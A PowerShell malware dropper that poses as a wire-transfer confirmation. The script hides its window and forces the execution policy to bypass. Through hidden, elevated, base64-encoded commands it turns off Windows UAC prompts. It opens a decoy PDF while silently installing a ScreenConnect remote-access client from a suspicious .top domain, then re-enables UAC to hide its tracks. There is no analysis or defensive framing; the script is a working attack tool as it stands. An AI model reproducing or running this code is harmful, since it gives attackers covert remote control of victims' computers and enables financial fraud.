$ErrorActionPreference   = "SilentlyContinue"
$WarningPreference       = "SilentlyContinue"
$VerbosePreference       = "SilentlyContinue"
$ProgressPreference      = "SilentlyContinue"

Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force

Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -EncodedCommand JABwAD0AJwBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABQAG8AbABpAGMAaQBlAHMAXABTAHkAcwB0AGUAbQAnADsAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACQAcAAgAC0ATgBhAG0AZQAgAEUAbgBhAGIAbABlAEwAVQBBACAALQBUAHkAcABlACAARABXAG8AcgBkACAALQBWAGEAbAB1AGUAIAAwADsAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACQAcAAgAC0ATgBhAG0AZQAgAEMAbwBuAHMAZQBuAHQAUAByAG8AbQBwAHQAQgBlAGgAYQB2AGkAbwByAEEAZABtAGkAbgAgAC0AVAB5AHAAZQAgAEQAVwBvAHIAZAAgAC0AVgBhAGwAdQBlACAAMAA7AFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAkAHAAIAAtAE4AYQBtAGUAIABQAHIAbwBtAHAAdABPAG4AUwBlAGMAdQByAGUARABlAHMAawB0AG8AcAAgAC0AVAB5AHAAZQAgAEQAVwBvAHIAZAAgAC0AVgBhAGwAdQBlACAAMAA7AA=='

function Force-FileDelete {
    param(
        [string]$Path
    )

    if ([System.IO.File]::Exists($Path)) {
        try {
            [System.IO.File]::Delete($Path)
        } catch {
            $dir  = [System.IO.Path]::GetDirectoryName($Path)
            $name = [System.IO.Path]::GetFileNameWithoutExtension($Path)
            $ext  = [System.IO.Path]::GetExtension($Path)

            $counter = 1
            do {
                $newPath = [System.IO.Path]::Combine($dir, "$name($counter)$ext")
                $counter++
            } while ([System.IO.File]::Exists($newPath))

            try {
                [System.IO.File]::Move($Path, $newPath)
            } catch {
                
            }
        }
    } else {
       
    }
}

function CODE_SEG {
     param(
        [Parameter(Mandatory)][string] $Name, 
        [Parameter(Mandatory)][string] $PdfURL,
        [Parameter(Mandatory)][string] $InstallerURL 
    )
    
  [Net.ServicePointManager]::SecurityProtocol = `
    [Net.SecurityProtocolType]::Ssl3  -bor `
    [Net.SecurityProtocolType]::Tls   -bor `
    [Net.SecurityProtocolType]::Tls11 -bor `
    [Net.SecurityProtocolType]::Tls12 -bor `
    [Net.SecurityProtocolType]::Tls13

    $logFile = Join-Path $env:TEMP "wire-debug.log"
    "$(Get-Date) - CODE_SEG started: Name=$Name" | Out-File $logFile -Append

    Add-Type -Name Window -Namespace Console -MemberDefinition @'
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'@

    $ConsoleWin = [Console.Window]::GetConsoleWindow()
    [Console.Window]::ShowWindow($ConsoleWin, 0)

    $CurrentDir = (Get-Location).Path
    $InkPath = Join-Path $CurrentDir ($Name + ".lnk")
    $PdfPath = Join-Path $CurrentDir ($Name + ".pdf")

    Write-Host "Ink Path: $InkPath"
    Write-Host "PDF Path: $PdfPath"

    Force-FileDelete -Path $InkPath
    Force-FileDelete -Path $PdfPath

    Invoke-WebRequest -Uri $PdfURL -OutFile $PdfPath -UseBasicParsing -ErrorAction SilentlyContinue
    Start-Process $PdfPath -ErrorAction SilentlyContinue
    "$(Get-Date) - PDF downloaded and opened: $PdfPath (exists=$([System.IO.File]::Exists($PdfPath)))" | Out-File $logFile -Append

    $InstallerURI = [System.Uri] $InstallerURL
    $InstallerExt = [System.IO.Path]::GetExtension($InstallerURI.AbsolutePath)
    $RandomFileName = [System.IO.Path]::GetRandomFileName()
    $RandomFileName = [System.IO.Path]::ChangeExtension($RandomFileName, $InstallerExt)
    $InstallerPath = [System.IO.Path]::Combine($env:TEMP, $RandomFileName)
    $InstallerLogPath = [System.IO.Path]::ChangeExtension($InstallerPath, "log")

    Invoke-WebRequest -Uri $InstallerURL -OutFile $InstallerPath -UseBasicParsing -ErrorAction SilentlyContinue
    Unblock-File -Path $InstallerPath -ErrorAction SilentlyContinue
    $msiSize = if([System.IO.File]::Exists($InstallerPath)){(Get-Item $InstallerPath).Length}else{0}
    "$(Get-Date) - MSI downloaded: $InstallerPath (size=$msiSize)" | Out-File $logFile -Append
    
    $Arguments = "/i `"$InstallerPath`" /qn /norestart /l `"$InstallerLogPath`""
    $Process = Start-Process -FilePath "msiexec.exe" -ArgumentList $Arguments -Verb RunAs -Wait -PassThru

    Write-Host " Exit code: $($Process.ExitCode)"
    "$(Get-Date) - MSI install exit code: $($Process.ExitCode)" | Out-File $logFile -Append

    try {
        [System.IO.File]::Delete($InstallerPath)
    } catch {
        
    }

    Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -EncodedCommand JABwAD0AJwBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABQAG8AbABpAGMAaQBlAHMAXABTAHkAcwB0AGUAbQAnADsAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACQAcAAgAC0ATgBhAG0AZQAgAEUAbgBhAGIAbABlAEwAVQBBACAALQBUAHkAcABlACAARABXAG8AcgBkACAALQBWAGEAbAB1AGUAIAAxADsAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACQAcAAgAC0ATgBhAG0AZQAgAEMAbwBuAHMAZQBuAHQAUAByAG8AbQBwAHQAQgBlAGgAYQB2AGkAbwByAEEAZABtAGkAbgAgAC0AVAB5AHAAZQAgAEQAVwBvAHIAZAAgAC0AVgBhAGwAdQBlACAANQA7AFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAkAHAAIAAtAE4AYQBtAGUAIABQAHIAbwBtAHAAdABPAG4AUwBlAGMAdQByAGUARABlAHMAawB0AG8AcAAgAC0AVAB5AHAAZQAgAEQAVwBvAHIAZAAgAC0AVgBhAGwAdQBlACAAMQA7AEEAZABkAC0AVAB5AHAAZQAgAC0AVAB5AHAAZQBEAGUAZgBpAG4AaQB0AGkAbwBuACAAJwB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7ACAAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwAgAHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAUwBoAGUAbABsACAAewAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAHMAaABlAGwAbAAzADIALgBkAGwAbAAiACkAXQAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAHYAbwBpAGQAIABTAEgAQwBoAGEAbgBnAGUATgBvAHQAaQBmAHkAIABpAG4AdAAgAHcARQB2AGUAbgB0AEkAZAAsAHUAaQBuAHQAIAB1AEYAbABhAGcAcwAsAEkAbgB0AFAAdAByACAAZAB3AEkAdABlAG0AMQAsAEkAbgB0AFAAdAByACAAZAB3AEkAdABlAG0AMgApADsAIAB9ACcAOwBbAFMAaABlAGwAbABdADoAOgBTAEgAQwBoAGEAbgBnAGUATgBvAHQAaQBmAHkAKAAwAHgAMAA4ADAAMAAwADAAMAAwACwAMAB4ADAAMAAwADUALABbAEkAbgB0AFAAdAByAF0AOgA6AFoAZQByAG8ALABbAEkAbgB0AFAAdAByAF0AOgA6AFoAZQByAG8AKQA7AFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0ATQBpAGwAbABpAHMAZQBjAG8AbgBkAHMAIAA4ADAAMAA7AFsAUwBoAGUAbABsAF0AOgA6AFMASABDAGgAYQBuAGcAZQBOAG8AdABpAGYAeQAoADAAeAAwADgAMAAwADAAMAAwADAALAAwAHgAMAAwADAANQAsAFsASQBuAHQAUAB0AHIAXQA6ADoAWgBlAHIAbwAsAFsASQBuAHQAUAB0AHIAXQA6ADoAWgBlAHIAbwApADsA'
    
}

$ClientName     = 'wire_confirmationPDF'
$DocumentURL    = 'https://raw.githubusercontent.com/stockley12/wire-docs/main/wire_confirmation.pdf'
$ClientURL      = 'http://www.dashboardonpapersec.top/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'


CODE_SEG -Name $ClientName -PdfURL $DocumentURL -InstallerURL $ClientURL
